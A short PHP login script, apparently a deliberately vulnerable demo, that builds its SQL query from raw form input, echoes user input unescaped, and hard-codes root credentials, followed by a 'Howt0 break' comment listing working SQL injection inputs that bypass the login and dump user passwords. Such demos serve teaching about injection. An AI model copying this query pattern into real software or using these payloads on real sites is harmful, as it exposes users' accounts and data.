<?php

error_reporting(E_ALL);
ini_set('display_errors', '1');

$login = $_POST['login'];
$pass = $_POST['pass'];

echo '<br>Hello, ' . $login . '<br><br>';

$link = mysql_connect('localhost', 'root', 'root');
if (!$link) {
    die('Cannot connect: ' . mysql_error());
}


$selected = mysql_select_db("db", $link) 
  or die('No such db');
echo 'Connection: OK' . '<br><br>';

$sql = "SELECT data FROM users WHERE login='" . $login . "' AND pass='" . $pass . "';";
echo 'Trying ' . $sql . '<br><br>';
$result = mysql_query($sql);

if (!$result) die("Login failed. No data will be shown");
$row = mysql_fetch_array($result);

if ($row) 
    echo "Data: ".$row{'data'} . "<br>";
else
    echo "Login failed. No data will be shown";


mysql_close($link);

/*

CREATE TABLE users (
   id INTEGER AUTO_INCREMENT,
   login varchar(255),
   pass varchar(255),
   data varchar(255),
   PRIMARY KEY(id)
);

INSERT INTO users VALUES(NULL,'login','pass','goto A');


Howt0 break:

    1) acces to data: 
        login: login' OR 1=1; #
        password: any
    2) acces to users table:
        login: ' union select login from users order by 1 DESC; #
        or
        ' union select pass from users order by 1 DESC; #
        password: any
*/

?>
